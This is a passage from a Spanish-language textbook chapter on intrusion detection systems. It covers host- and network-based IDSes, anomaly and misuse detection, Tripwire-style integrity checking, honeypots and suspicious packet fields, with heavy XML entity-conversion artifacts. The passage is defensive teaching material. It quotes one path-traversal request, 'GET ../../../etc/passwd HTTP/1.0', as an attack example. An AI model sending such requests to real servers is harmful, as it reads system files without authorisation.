tiene porqu&#x00E9; (y de hecho en la mayor parte de casos no suele ser as&#x02CA;&#x0131;) ubicarse en todas las m&#x00E1;quinas de esa
red.
     </para><itemizedlist>
     <listitem>
     <!--l. 82--><para>IDSes basados en red.
     <!--br/-->Un IDS basado en red monitoriza los paquetes que circulan por nuestra red en busca de
     elementos que denoten un ataque contra alguno de los sistemas ubicados en ella; el IDS puede
     situarse en cualquiera de los hosts o en un elemento que analice todo el tr&#x00E1;&#xFB01;co (como un HUB o
     un enrutador). Est&#x00E9; donde est&#x00E9;, monitorizar&#x00E1; diversas m&#x00E1;quinas y no una sola: esta es la principal
     diferencia con los sistemas de detecci&#x00F3;n de intrusos basados en host.
     </para></listitem>
     <listitem>
     <!--l. 90--><para>IDSes basados en m&#x00E1;quina.
     <!--br/-->Mientras que los sistemas de detecci&#x00F3;n de intrusos basados en red operan bajo todo un dominio
     de colisi&#x00F3;n, los basados en m&#x00E1;quina realizan su funci&#x00F3;n protegiendo un &#x00FA;nico sistema; de una forma
     similar &#x2013; guardando las distancias, por supuesto &#x2013; a como act&#x00FA;a un escudo antivirus residente
     en MS-DOS, el IDS es un proceso que trabaja en background (o que despierta peri&#x00F3;dicamente)
     buscando patrones que puedan denotar un intento de intrusi&#x00F3;n y alertando o tomando las
     medidas oportunas en caso de que uno de estos intentos sea detectado.</para></listitem></itemizedlist>
<!--l. 100--><para>Algunos autores (<citation>[?]</citation>) dividen el segundo grupo, el de los sistemas de detecci&#x00F3;n de intrusos basados en
m&#x00E1;quina, en tres subcategor&#x02CA;&#x0131;as:
     </para><itemizedlist>
     <listitem>
     <!--l. 103--><para>Veri&#xFB01;cadores de integridad del sistema (SIV).
     <!--br/-->Un veri&#xFB01;cador de integridad no es m&#x00E1;s que un mecanismo encargado de monitorizar archivos de
     una m&#x00E1;quina en busca de posibles modi&#xFB01;caciones no autorizadas, por norma general backdoors
     dejadas por un intruso (por ejemplo, una entrada adicional en el &#xFB01;chero de contrase~nas o un
     /bin/login que permite el acceso ante cierto nombre de usuario no registrado). El SIV m&#x00E1;s
     conocido es sin duda Tripwire, comentado en este mismo trabajo; la importancia de estos
     mecanismos es tal que en la actualidad algunos sistemas Unix integran &#x2018;de serie&#x2019; veri&#xFB01;cadores
     de integridad, como Solaris y su ASET (Automated Security Enhancement Tools).
     </para></listitem>
     <listitem>
     <!--l. 113--><para>Monitores de registros (LFM).
     <!--br/-->Estos sistemas monitorizan los archivos de log generados por los programas &#x2013; generalmente
     demonios de red &#x2013; de una m&#x00E1;quina en busca de patrones que puedan indicar un ataque o una
     intrusi&#x00F3;n. Un ejemplo de monitor puede ser swatch, pero m&#x00E1;s habituales que &#x00E9;l son los peque~nos
     shellscripts que casi todos los administradores realizan para comprobar peri&#x00F3;dicamente sus
     archivos de log en busca de entradas sospechosas (por ejemplo, conexiones rechazadas en varios
     puertos provenientes de un determinado host, intentos de entrada remota como root&#x2026;).
     </para></listitem>
     <listitem>

     <!--l. 122--><para>Sistemas de decepci&#x00F3;n.
     <!--br/-->Los sistemas de decepci&#x00F3;n o tarros de miel (honeypots), como Deception Toolkit (DTK), son
     mecanismos encargados de simular servicios con problemas de seguridad de forma que un
     pirata piense que realmente el problema se puede aprovechar para acceder a un sistema,
     cuando realmente se est&#x00E1; aprovechando para registrar todas sus actividades. Se trata de un
     mecanismo &#x00FA;til en muchas ocasiones &#x2013; por ejemplo, para conseguir &#x2018;entretener&#x2019; al atacante
     mientras se tracea su conexi&#x00F3;n &#x2013; pero que puede resultar peligroso: &#x00BF;qu&#x00E9; sucede si el propio
     sistema de decepci&#x00F3;n tiene un bug que desconocemos, y el atacante lo aprovecha para acceder
     realmente a nuestra m&#x00E1;quina?</para></listitem></itemizedlist>
<!--l. 134--><para>Realmente esta divisi&#x00F3;n queda algo pobre, ya que cada d&#x02CA;&#x0131;a se avanza m&#x00E1;s en la construcci&#x00F3;n de sistemas de
detecci&#x00F3;n de intrusos basados en host que no podr&#x02CA;&#x0131;an englobarse en ninguna de las subcategor&#x02CA;&#x0131;as
anteriores.
<!--br/-->
<!--br/-->La segunda gran clasi&#xFB01;caci&#x00F3;n de los IDSes se realiza en funci&#x00F3;n de c&#x00F3;mo act&#x00FA;an estos sistemas; actualmente
existen dos grandes t&#x00E9;cnicas de detecci&#x00F3;n de intrusos (<citation>[?]</citation>): las basadas en la detecci&#x00F3;n de anomal&#x02CA;&#x0131;as (anomaly
detection) y las basadas en la detecci&#x00F3;n de usos indebidos del sistema (misuse detection). Aunque m&#x00E1;s tarde
hablaremos con mayor profundidad de cada uno de estos modelos, la idea b&#x00E1;sica de los mismos es la
siguiente:
     </para><itemizedlist>
     <listitem>
     <!--l. 146--><para>Detecci&#x00F3;n de anomal&#x02CA;&#x0131;as.
     <!--br/-->La base del funcionamiento de estos sistemas es suponer que una intrusi&#x00F3;n se puede ver como
     una anomal&#x02CA;&#x0131;a de nuestro sistema, por lo que si fu&#x00E9;ramos capaces de establecer un per&#xFB01;l del
     comportamiento habitual de los sistemas ser&#x02CA;&#x0131;amos capaces de detectar las intrusiones por pura
     estad&#x02CA;&#x0131;stica: probablemente una intrusi&#x00F3;n ser&#x02CA;&#x0131;a una desviaci&#x00F3;n excesiva de la media de nuestro
     per&#xFB01;l de comportamiento.
     </para></listitem>
     <listitem>
     <!--l. 153--><para>Detecci&#x00F3;n de usos indebidos.
     <!--br/-->El  funcionamiento  de  los  IDSes  basados  en  la  detecci&#x00F3;n  de  usos  indebidos  presupone
     que  podemos  establecer  patrones  para  los  diferentes  ataques  conocidos  y  algunas  de  sus
     variaciones; mientras que la detecci&#x00F3;n de anomal&#x02CA;&#x0131;as conoce lo normal (en ocasiones se dice
     que tienen un &#x2018;conocimiento positivo&#x2019;, positive knowledge) y detecta lo que no lo es, este
     esquema se limita a conocer lo anormal para poderlo detectar (conocimiento negativo, negative
     knowledge).</para></listitem></itemizedlist>
<!--l. 162--><para>Para ver m&#x00E1;s claramente la diferencia entre ambos esquemas, imaginemos un sistema de detecci&#x00F3;n basado en
monitorizar las m&#x00E1;quinas origen desde las que un usuario sospechoso conecta a nuestro sistema: si se
tratara de un modelo basado en la detecci&#x00F3;n de anomal&#x02CA;&#x0131;as, seguramente mantendr&#x02CA;&#x0131;a una lista de las dos o
tres direcciones m&#x00E1;s utilizadas por el usuario leg&#x02CA;&#x0131;timo, alertando al responsable de seguridad en caso de que
el usuario conecte desde otro lugar; por contra, si se tratara de un modelo basado en la detecci&#x00F3;n de usos
indebidos, mantendr&#x02CA;&#x0131;a una lista mucho m&#x00E1;s amplia que la anterior, pero formada por las direcciones
desde las sabemos con una alta probabilidad que ese usuario no va a conectar, de forma que si
detectara un acceso desde una de esas m&#x00E1;quinas, entonces es cuando el sistema tomar&#x02CA;&#x0131;a las acciones
oportunas.
<!--br/-->
<!--br/-->En muchos trabajos (<citation>[?]</citation>, <citation>[?]</citation>&#x2026;) aparece una tercera clasi&#xFB01;caci&#x00F3;n de los IDSes; se trata de la diferenciaci&#x00F3;n
entre los sistemas que trabajan peri&#x00F3;dicamente (denominados &#x2018;pasivos&#x2019;) y los que operan en tiempo real
(activos). Nosotros no contemplaremos, aunque la citemos, esta clasi&#xFB01;caci&#x00F3;n, ya que es totalmente
minoritaria en comparaci&#x00F3;n con las otras dos que hemos comentado. De cualquier forma, la idea es muy
simple: un IDS de tiempo real (los denominados Real&#x2013;Time Intrusion Detection Systems) trabaja
cont&#x02CA;&#x0131;nuamente en busca de posibles ataques, mientras que los sistemas que se ejecutan a intervalos
(Vulnerability Scanners) son analizadores de vulnerabilidades que cualquier administrador ha de ejecutar
regularmente (ya sea de forma manual o autom&#x00E1;tica) contra sus sistemas para veri&#xFB01;car que no presentan
problemas de seguridad.

  </para></section><!--end section--><!--l. 187--><section 
role="section"><title><abbrev role="title-mark">18.3</abbrev><anchor 
   id="x1-28300018.3"  ></anchor>Requisitos de un IDS</title>
<!--l. 188--><para>  Sin importar qu&#x00E9; sistemas vigile o su forma de trabajar, cualquier sistema de detecci&#x00F3;n de intrusos ha de
cumplir algunas propiedades para poder desarrollar su trabajo correctamente. En primer lugar, y quiz&#x00E1;s
como caracter&#x02CA;&#x0131;stica m&#x00E1;s importante, el IDS ha de ejecutarse cont&#x02CA;&#x0131;nuamente sin nadie que est&#x00E9; obligado a
supervisarlo; independientemente de que al detectar un problema se informe a un operador o se lance una
respuesta autom&#x00E1;tica, el funcionamiento habitual no debe implicar interacci&#x00F3;n con un humano. Podemos
&#xFB01;jarnos en que esto parece algo evidente: muy pocas empresas estar&#x02CA;&#x0131;an dispuestas a contratar a una o
varias personas simplemente para analizar logs o controlar los patrones del tr&#x00E1;&#xFB01;co de una red. Sin entrar a
juzgar la superioridad de los humanos frente a las m&#x00E1;quinas (&#x00BF;puede un algoritmo determinar
perfectamente si un uso del sistema est&#x00E1; correctamente autorizado?) o viceversa (&#x00BF;ser&#x02CA;&#x0131;a capaz una persona
de analizar en tiempo real todo el tr&#x00E1;&#xFB01;co que llega a un servidor web mediano?), hemos de
tener presente que los sistemas de detecci&#x00F3;n son mecanismos automatizados que se instalan y
con&#xFB01;guran de forma que su trabajo habitual sea transparente a los operadores del entorno
inform&#x00E1;tico.
<!--br/-->
<!--br/-->Otra propiedad, y tambi&#x00E9;n como una caracter&#x02CA;&#x0131;stica a tener siempre en cuenta, es la aceptabilidad o grado
de aceptaci&#x00F3;n del IDS; al igual que suced&#x02CA;&#x0131;a con cualquier modelo de autenticaci&#x00F3;n, los mecanismos de
detecci&#x00F3;n de intrusos han de ser aceptables para las personas que trabajan habitualmente en el
entorno. Por ejemplo, no ha de introducir una sobrecarga considerable en el sistema (si un
IDS ralentiza demasiado una m&#x00E1;quina, simplemente no se utilizar&#x00E1;) ni generar una cantidad
elevada de falsos positivos (detecci&#x00F3;n de intrusiones que realmente no lo son) o de logs, ya que
entonces llegar&#x00E1; un momento en que nadie se preocupe de comprobar las alertas emitidas por
el detector. Por supuesto (y esto puede parecer una tonter&#x02CA;&#x0131;a, pero es algo que se hace m&#x00E1;s a
menudo de lo que podamos imaginar), si para evitar problemas con las intrusiones simplemente
apagamos el equipo o lo desconectamos de la red, tenemos un sistema bastante seguro&#x2026;pero
inaceptable.
<!--br/-->
<!--br/-->Una tercera caracter&#x02CA;&#x0131;stica a evaluar a la hora de hablar de sistemas de detecci&#x00F3;n de intrusos es la
adaptabilidad del mismo a cambios en el entorno de trabajo. Como todos sabemos, ning&#x00FA;n sistema
inform&#x00E1;tico puede considerarse est&#x00E1;tico: desde la aplicaci&#x00F3;n m&#x00E1;s peque~na hasta el propio kernel de Unix,
pasando por supuesto por la forma de trabajar de los usuarios (&#x00BF;qui&#x00E9;n nos asegura que ese engorroso
procedimiento desde una &#x2018;desfasada&#x2019; l&#x02CA;&#x0131;nea de &#x00F3;rdenes ma~nana no se realizar&#x00E1; desde una aplicaci&#x00F3;n gr&#x00E1;&#xFB01;ca, que
realmente hace el mismo trabajo pero que genera unos patrones completamente diferentes en nuestro
sistema?), todo cambia con una periodicidad m&#x00E1;s o menos elevada. Si nuestros mecanismos de
detecci&#x00F3;n de intrusos no son capaces de adaptarse r&#x00E1;pidamente a esos cambios, est&#x00E1;n condenados al
fracaso.
<!--br/-->
<!--br/-->Todo IDS debe adem&#x00E1;s presentar cierta tolerancia a fallos o capacidad de respuesta ante situaciones
inesperadas; insistiendo en lo que coment&#x00E1;bamos antes sobre el car&#x00E1;cter altamente din&#x00E1;mico de un entorno
inform&#x00E1;tico, algunos &#x2013; o muchos &#x2013; de los cambios que se pueden producir en dicho entorno no son
graduales sino bruscos, y un IDS ha de ser capaz de responder siempre adecuadamente ante los
mismos. Podemos contemplar, por ejemplo, un reinicio inesperado de varias m&#x00E1;quinas o un
intento de enga~no hacia el IDS; esto &#x00FA;ltimo es especialmente cr&#x02CA;&#x0131;tico: s&#x00F3;lo hemos de pararnos a
pensar que si un atacante consigue modi&#xFB01;car el comportamiento del sistema de detecci&#x00F3;n y el
propio sistema no se da cuenta de ello, la intrusi&#x00F3;n nunca ser&#x00E1; noti&#xFB01;cada, con los dos graves
problemas que eso implica: aparte de la intrusi&#x00F3;n en s&#x02CA;&#x0131;, la falsa sensaci&#x00F3;n de seguridad que produce
un IDS que no genera ninguna alarma es un grave inconveniente de cara a lograr sistemas
seguros.
  </para></section><!--end section--><!--l. 246--><section 
role="section"><title><abbrev role="title-mark">18.4</abbrev><anchor 
   id="x1-28400018.4"  ></anchor>IDSes basados en m&#x00E1;quina</title>
<!--l. 247--><para>  Como antes hemos comentado, un sistema de detecci&#x00F3;n de intrusos basado en m&#x00E1;quina (host&#x2013;based IDS) es
un mecanismo que permite detectar ataques o intrusiones contra la m&#x00E1;quina sobre la que se
ejecuta.
<!--br/-->

<!--br/-->Tradicionalmente, los modelos de detecci&#x00F3;n basados en m&#x00E1;quina han consistido por una parte en la utilizaci&#x00F3;n
de herramientas autom&#x00E1;ticas de an&#x00E1;lisis de logs generados por diferentes aplicaciones o por el propio kernel
del sistema operativo, prestando siempre especial atenci&#x00F3;n a los registros relativos a demonios de red, como
un servidor web o el propio inetd, y por otra &#x2013; quiz&#x00E1;s no tan habitual como la anterior &#x2013; en
el uso de veri&#xFB01;cadores de integridad de determinados &#xFB01;cheros vitales para el sistema, como
el de contrase~nas; no obstante, desde hace unos a~nos un tercer esquema de detecci&#x00F3;n se est&#x00E1;
implantando con cierta fuerza: se trata de los sistemas de detecci&#x00F3;n, honeypots o tarros de
miel.
<!--br/-->
<!--br/-->El an&#x00E1;lisis de logs generados por el sistema (entendiendo como tales no s&#x00F3;lo a los relativos al n&#x00FA;cleo, sino
tambi&#x00E9;n a aquellos de aplicaciones nativas de cada Unix, como syslogd) var&#x02CA;&#x0131;a entre diferentes clones de
Unix por una sencilla raz&#x00F3;n: cada uno de ellos guarda la informaci&#x00F3;n con un cierto formato, y en
determinados &#xFB01;cheros, aunque todos &#x2013; o casi todos &#x2013; sean capaces de registrar los mismos datos, que son
aquellos que pueden ser indicativos de un ataque. La mayor parte de Unices son capaces de registrar con
una granularidad lo su&#xFB01;cientemente &#xFB01;na casi todas las actividades que se llevan a cabo en el sistema,
en especial aquellas que pueden suponer &#x2013; aunque sea remotamente &#x2013; una vulneraci&#x00F3;n de su
seguridad; sin embargo, el problema radica en que pocos administradores se preocupan de
revisar con un m&#x02CA;&#x0131;nimo de atenci&#x00F3;n esos logs, por lo que muchos ataques contra la m&#x00E1;quina, tanto
externos como internos, y tanto fallidos como exitosos, pasan &#xFB01;nalmente desapercibidos. Aqu&#x02CA;&#x0131; es
donde entran en juego las herramientas autom&#x00E1;ticas de an&#x00E1;lisis, como swatch o logcheck; a
grandes rasgos, realizan la misma actividad que podr&#x02CA;&#x0131;a ejecutar un shellscript convenientemente
plani&#xFB01;cado que incluyera entre sus l&#x02CA;&#x0131;neas algunos grep de registros sospechosos en los archivos de
log.
<!--br/-->
<!--br/-->&#x00BF;A qu&#x00E9; entradas de estos &#xFB01;cheros debemos estar atentos? Evidentemente, esto depende de cada sistema y
de lo que sea &#x2018;normal&#x2019; en &#x00E9;l, aunque suelen existir registros que en cualquier m&#x00E1;quina denotan una actividad
cuanto menos sospechosa. Esto incluye ejecuciones fallidas o exitosas de la orden su, peticiones no
habituales al servicio SMTP (como vrfy o expn), conexiones a diferentes puertos rechazadas por TCP
Wrappers, intentos de acceso remotos como superusuario, etc; si en la propia m&#x00E1;quina tenemos instalado un
cortafuegos independiente del corporativo, o cualquier otro software de seguridad &#x2013; uno que quiz&#x00E1;s es
especialmente recomendable es PortSentry &#x2013;, tambi&#x00E9;n conviene estar atentos a los logs generados por los
mismos, que habitualmente se registran en los &#xFB01;cheros normales de auditor&#x02CA;&#x0131;a del sistema (syslog,
messages&#x2026;) y que suelen contener informaci&#x00F3;n que con una probabilidad elevada denotan un ataque
real.
<!--br/-->
<!--br/-->Por otra parte, la veri&#xFB01;caci&#x00F3;n de integridad de archivos se puede realizar a diferentes niveles, cada uno de
los cuales ofrece un mayor o menor grado de seguridad. Por ejemplo, un administrador puede programar y
plani&#xFB01;car un sencillo shellscript para que se ejecute peri&#x00F3;dicamente y compruebe el propietario y el tama~no
de ciertos &#xFB01;cheros como /etc/passwd o /etc/shadow; evidentemente, este esquema es extremadamente
d&#x00E9;bil, ya que si un usuario se limita a cambiar en el archivo correspondiente su UID de 100 a 000,
este modelo no descubrir&#x02CA;&#x0131;a el ataque a pesar de su gravedad. Por tanto, parece obvio que se
necesita un esquema de detecci&#x00F3;n mucho m&#x00E1;s robusto, que compruebe aparte de la integridad
de la informaci&#x00F3;n registrada en el inodo asociado a cada &#xFB01;chero (fecha de &#x00FA;ltima modi&#xFB01;caci&#x00F3;n,
propietario, grupo propietario&#x2026;) la integridad de la informaci&#x00F3;n contenida en dicho archivo; y
esto se consigue muy f&#x00E1;cilmente utilizando funciones resumen sobre cada uno de los &#xFB01;cheros a
monitorizar, funciones capaces de generar un hash &#x00FA;nico para cada contenido de los archivos. De
esta forma, cualquier modi&#xFB01;caci&#x00F3;n en su contenido generar&#x00E1; un resumen diferente, que al ser
comparado con el original dar&#x00E1; la voz de alarma; esta es la forma de trabajar de Tripwire, el
m&#x00E1;s conocido y utilizado de todos los veri&#xFB01;cadores de integridad disponibles para entornos
Unix.
<!--br/-->
<!--br/-->Sea cual sea nuestro modelo de veri&#xFB01;caci&#x00F3;n, en cualquiera de ellos debemos llevar a cabo inicialmente un
paso com&#x00FA;n: generar una base de datos de referencia contra la que posteriormente compararemos la
informaci&#x00F3;n de cada archivo. Por ejemplo, si nos limitamos a comprobar el tama~no de ciertos &#xFB01;cheros
debemos, nada m&#x00E1;s con&#xFB01;gurar el sistema, registrar todos los nombres y tama~nos de los &#xFB01;cheros que
deseemos, para despu&#x00E9;s comparar la informaci&#x00F3;n que peri&#x00F3;dicamente registraremos en nuestra m&#x00E1;quina con la
que hemos almacenado en dicha base de datos; si existen diferencias, podemos encontrarnos ante

un indicio de ataque. Lo mismo suceder&#x00E1; si registramos funciones resumen: debemos generar
un hash inicial de cada archivo contra el que comparar despu&#x00E9;s la informaci&#x00F3;n obtenida en la
m&#x00E1;quina. Independientemente de los contenidos que deseemos registrar en esa base de datos
inicial, siempre hemos de tener presente una cosa: si un pirata consigue modi&#xFB01;carla de forma no
autorizada, habr&#x00E1; burlado por completo a nuestro sistema de veri&#xFB01;caci&#x00F3;n. As&#x02CA;&#x0131;, es vital mantener
su integridad; incluso es recomendable utilizar medios de s&#x00F3;lo lectura, como un CD-ROM, o
incluso unidades extra&#x02CA;&#x0131;bles &#x2013; discos o disquetes &#x2013; que habitualmente no estar&#x00E1;n disponibles en el
sistema, y s&#x00F3;lo se utilizar&#x00E1;n cuando tengamos que comprobar la integridad de los archivos de la
m&#x00E1;quina.
<!--br/-->
<!--br/-->Por &#x00FA;ltimo, aunque su utilizaci&#x00F3;n no est&#x00E9; tan extendida como la de los analizadores de logs o la de los
veri&#xFB01;cadores de integridad, es necesario hablar, dentro de la categor&#x02CA;&#x0131;a de los sistemas de detecci&#x00F3;n de
intrusos basados en m&#x00E1;quina, de los sistemas de decepci&#x00F3;n o honeypots. B&#x00E1;sicamente, estos &#x2018;tarros de miel&#x2019;
son sistemas completos o parte de los mismos (aplicaciones, servicios, subentornos&#x2026;) dise~nados para recibir
ciertos tipos de ataques; cuando sufren uno, los honeypots detectan la actividad hostil y aplican una
estrategia de respuesta. Dicha estrategia puede consistir desde un simple correo electr&#x00F3;nico al responsable
de la seguridad de la m&#x00E1;quina hasta un bloqueo autom&#x00E1;tico de la direcci&#x00F3;n atacante; incluso muchos de los
sistemas &#x2013; la mayor&#x02CA;&#x0131;a &#x2013; son capaces de simular vulnerabilidades conocidas de forma que el atacante piense
que ha tenido &#x00E9;xito y prosiga con su actividad, mientras es monitorizado por el detector de
intrusos.
<!--br/-->
<!--br/-->El concepto te&#x00F3;rico que est&#x00E1; detr&#x00E1;s de los tarros de miel es el denominado &#x2018;conocimiento negativo&#x2019;:
proporcionar deliveradamente a un intruso informaci&#x00F3;n falsa &#x2013; pero que &#x00E9;l considerar&#x00E1; real &#x2013; de nuestros
sistemas, con diferentes &#xFB01;nes: desde poder monitorizar durante m&#x00E1;s tiempo sus actividades, hasta
despistarlo, pasando por supuesto por la simple diversi&#x00F3;n. Evidentemente, para lograr enga~nar a un pirata
medianamente experimentado la simulaci&#x00F3;n de vulnerabilidades ha de ser muy &#x2018;real&#x2019;, dedicando a tal efecto
incluso sistemas completos (denominados &#x2019;m&#x00E1;quinas de sacri&#xFB01;cio&#x2019;), pero con atacantes de nivel medio o bajo
dicho enga~no es much&#x02CA;&#x0131;simo m&#x00E1;s sencillo: en muchos casos basta simular la existencia de un troyano como
BackOri&#xFB01;ce mediante FakeBO (http://cvs.linux.hr/fakebo/) para que el pirata determine
que realmente estamos infectados e intente utilizar ese camino en su ataque contra nuestro
sistema.
<!--br/-->
<!--br/-->Algunos sistemas de decepci&#x00F3;n no simulan vulnerabilidades tal y como habitualmente se suele entender este
concepto; dicho de otra forma, su objetivo no es enga~nar a un atacante durante mucho tiempo,
proporcion&#x00E1;ndole un subentorno en el sistema que aparente de forma muy realista ser algo vulnerable, sino
que su &#x2018;decepci&#x00F3;n&#x2019; es bastante m&#x00E1;s elemental: se limitan a presentar un aspecto (quiz&#x00E1;s deber&#x02CA;&#x0131;amos llamarle
interfaz) que parece vulnerable, pero que cualquier aprendiz de pirata puede descubrir sin problemas que
no es m&#x00E1;s que un enga~no. &#x00BF;D&#x00F3;nde est&#x00E1; entonces la funci&#x00F3;n de estos sistemas, denominados en ocasiones
&#x2018;detectores de pruebas&#x2019;? Por norma, su tarea es recopilar informaci&#x00F3;n del atacante y del ataque en s&#x02CA;&#x0131;; por
ejemplo, ya que antes hemos hablado de FakeBO, podemos imaginar un programa que se encargue de
escuchar en el puerto 31337 de nuestro sistema &#x2013; donde lo hace el troyano real &#x2013; y, cada vez que
alguien acceda a &#x00E9;l, guardar la hora, la direcci&#x00F3;n origen, y los datos enviados por el atacante. En
realidad, no es una simulaci&#x00F3;n que pueda enga~nar ni al pirata m&#x00E1;s novato, pero hemos logrado el
objetivo de cualquier sistema de detecci&#x00F3;n de intrusos: registrar el ataque; adem&#x00E1;s, tambi&#x00E9;n se
puede considerar un honeypot, ya que simula un entorno vulnerable, aunque s&#x00F3;lo logre enga~nar
a nuestro atacante durante unos segundos. De cualquier forma, es necesario indicar que en
algunas publicaciones (como <citation>[?]</citation>) se diferencia a los sistemas de decepci&#x00F3;n &#x2018;completos&#x2019; de estos
mecanismos de enga~no simple, aunque a todos se les englobe dentro del conjunto denominado
honeypots.
<!--br/-->
<!--br/-->Hemos revisado en este punto las ideas m&#x00E1;s generales de los sistemas de detecci&#x00F3;n de intrusos basados en
host; aunque hoy en d&#x02CA;&#x0131;a los que vamos a describir a continuaci&#x00F3;n, los basados en red, son con diferencia los
m&#x00E1;s utilizados, como veremos m&#x00E1;s adelante todos son igualmente necesarios si deseamos crear un esquema de
detecci&#x00F3;n con la m&#x00E1;xima efectividad. Se trata de niveles de protecci&#x00F3;n diferentes pero que tienen un mismo
objetivo: alertar de actividades sospechosas y, en algunos casos, proporcionar una respuesta autom&#x00E1;tica a
las mismas.

  </para></section><!--end section--><!--l. 393--><section 
role="section"><title><abbrev role="title-mark">18.5</abbrev><anchor 
   id="x1-28500018.5"  ></anchor>IDSes basados en red</title>
<!--l. 394--><para>  Los sistemas de detecci&#x00F3;n de intrusos basados en red (network&#x2013;based IDS) son aquellos capaces de
detectar ataques contra diferentes sistemas de una misma red (en concreto, de un mismo dominio de
colisi&#x00F3;n), aunque generalmente se ejecuten en uno solo de los hosts de esa red. Para lograr su
objetivo, al menos uno de los interfaces de red de esta m&#x00E1;quina sensor trabaja en modo promiscuo,
capturando y analizando todas las tramas que pasan por &#x00E9;l en busca de patrones indicativos de un
ataque.
<!--br/-->
<!--br/-->&#x00BF;Cu&#x00E1;les pueden ser estos &#x2018;patrones identi&#xFB01;cativos de un ataque&#x2019; a los que estamos haciendo referencia? Casi
cualquiera de los diferentes campos de una trama de red TCP/IP (podemos consultar <citation>[?]</citation>, <citation>[?]</citation> o <citation>[?]</citation>
para conocer en profundidad el signi&#xFB01;cado y la utilidad de cada uno de ellos) puede tener un
valor que, con mayor o menor probabilidad, represente un ataque real; los casos m&#x00E1;s habituales
incluyen:
     </para><itemizedlist>
     <listitem>
     <!--l. 408--><para>Campos de fragmentaci&#x00F3;n.
     <!--br/-->Una cabecera IP contiene dieciseis bits reservados a informaci&#x00F3;n sobre el nivel de fragmentaci&#x00F3;n
     del datagrama; de ellos, uno no se utiliza y trece indican el desplazamiento del fragmento que
     transportan. Los otros dos bits indican o bien que el paquete no ha de ser fragmentado por
     un router intermedio (DF, Don&#x02CA;
     </para><!--l. 413--><para>) o bien que el paquete ha sido fragmentado y no es el &#x00FA;ltimo que se va a recibir (MF, More
     Fragments). Valores incorrectos de par&#x00E1;metros de fragmentaci&#x00F3;n de los datagramas se han venido
     utilizando t&#x02CA;&#x0131;picamente para causar importantes negaciones de servicio a los sistemas y, desde
     hace tambi&#x00E9;n un tiempo incluso para obtener la versi&#x00F3;n del operativo que se ejecuta en un
     determinado host (<citation>[?]</citation>); por ejemplo, &#x00BF;qu&#x00E9; le suceder&#x02CA;&#x0131;a al subsistema de red implantado en el
     n&#x00FA;cleo de una m&#x00E1;quina Unix si nunca recibe una trama con el bit MF reseteado, indicando que
     es el &#x00FA;ltimo de un paquete? &#x00BF;se quedar&#x02CA;&#x0131;a permanentemente esper&#x00E1;ndola? &#x00BF;y si recibe uno que en
     teor&#x02CA;&#x0131;a no est&#x00E1; fragmentado pero se le indica que no es el &#x00FA;ltimo que va a recibir? &#x00BF;c&#x00F3;mo responder&#x02CA;&#x0131;a
     el n&#x00FA;cleo del operativo en este caso? Como vemos, si en nuestras m&#x00E1;quinas observamos ciertas
     combinaciones de bits relacionados con la fragmentaci&#x00F3;n realmente tenemos motivos para &#x2013;
     cuanto menos &#x2013; sospechar que alguien trata de atacarnos.
     </para></listitem>
     <listitem>
     <!--l. 429--><para>Direcci&#x00F3;n origen y destino.
     <!--br/-->Las direcciones de la m&#x00E1;quina que env&#x02CA;&#x0131;a un paquete y la de la que lo va a recibir tambi&#x00E9;n
     son campos interesantes de cara a detectar intrusiones en nuestros sistemas o en nuestra red.
     No tenemos m&#x00E1;s que pensar el tr&#x00E1;&#xFB01;co proveniente de nuestra DMZ (y que no se trate de la
     t&#x02CA;&#x0131;pica respuesta ante una petici&#x00F3;n como las que se generan al visitar p&#x00E1;ginas web, por poner
     un ejemplo) que tenga como destino nuestra red protegida: es muy posible que esos paquetes
     constituyan un intento de violaci&#x00F3;n de nuestra pol&#x02CA;&#x0131;tica de seguridad. Otros ejemplos cl&#x00E1;sicos
     son las peticiones originadas desde Internet y que tienen como destino m&#x00E1;quinas de nuestra
     organizaci&#x00F3;n que no est&#x00E1;n ofreciendo servicios directos al exterior, como un servidor de bases de
     datos cuyo acceso est&#x00E1; restringido a sistemas de nuestra red.
     </para></listitem>
     <listitem>
     <!--l. 442--><para>Puerto origen y destino.
     <!--br/-->Los  puertos  origen  y  destino  (especialmente  este  &#x00FA;ltimo)  son  un  excelente  indicativo  de
     actividades sospechosas en nuestra red. Aparte de los intentos de acceso no autorizado a
     servicios de nuestros sistemas, pueden detectar actividades que tambi&#x00E9;n supondr&#x00E1;n a priori
     violaciones de nuestras pol&#x02CA;&#x0131;ticas de seguridad, como la existencia de troyanos, ciertos tipos de
     barridos de puertos, o la presencia de servidores no autorizados dentro de nuestra red.
     </para></listitem>
     <listitem>

     <!--l. 450--><para>Flags TCP.
     <!--br/-->Uno de los campos de una cabecera TCP contiene seis bits (URG, ACK, PSH, RST, SYN y
     FIN),  cada  uno  de  ellos  con  una  &#xFB01;nalidad  diferente  (por  ejemplo,  el  bit SYN es  utilizado
     para  establecer  una  nueva  conexi&#x00F3;n,  mientras  que  FIN hace  justo  lo  contrario:  liberarla).
     Evidentemente el valor de cada uno de estos bits ser&#x00E1; 0 o 1, lo cual de forma aislada no suele
     decir mucho (ni bueno ni malo) de su emisor; no obstante, ciertas combinaciones de valores
     suelen ser bastante sospechosas: por ejemplo, una trama con los dos bits de los que hemos
     hablado &#x2013; SYN y FIN &#x2013; activados simult&#x00E1;neamente ser&#x02CA;&#x0131;a indicativa de una conexi&#x00F3;n que trata
     de abrirse y cerrarse al mismo tiempo. Para hacernos una idea de la importancia de estos
     bits de control, no conviene olvidar que uno de los problemas de seguridad m&#x00E1;s conocidos de
     los &#x00FA;ltimos a~nos sobre plataformas Windows &#x2013; de los muchos que han tenido estos entornos &#x2013;
     estaba fundamentado b&#x00E1;sicamente en el manejo de paquetes OOB (Out Of Band): tramas con
     el bit URG activado.
     </para></listitem>
     <listitem>
     <!--l. 467--><para>Campo de datos.
     <!--br/-->Seguramente,  el  campo  de  datos  de  un  paquete  que  circula  por  la  red  es  donde  m&#x00E1;s
     probabilidades tenemos de localizar un ataque contra nuestros sistemas; esto es debido a
     que con toda probabilidad nuestro cortafuegos corporativo detendr&#x00E1; tramas cuya cabecera sea
     &#x2018;sospechosa&#x2019; (por ejemplo, aquellas cuyo origen no est&#x00E9; autorizado a alcanzar su destino o
     con campos incorrectos), pero rara vez un &#xFB01;rewall se parar&#x00E1; a analizar el contenido de los
     datos transportados en la trama. Por ejemplo, una petici&#x00F3;n como &#x2018;GET ../../../etc/passwd
     HTTP/1.0&#x2019; contra el puerto 80 del servidor web de nuestra empresa no se detendr&#x00E1; en el
     cortafuegos,  pero  muy  probablemente  se  trata  de  un  intento  de  intrusi&#x00F3;n  contra  nuestros
     sistemas.</para></listitem></itemizedlist>
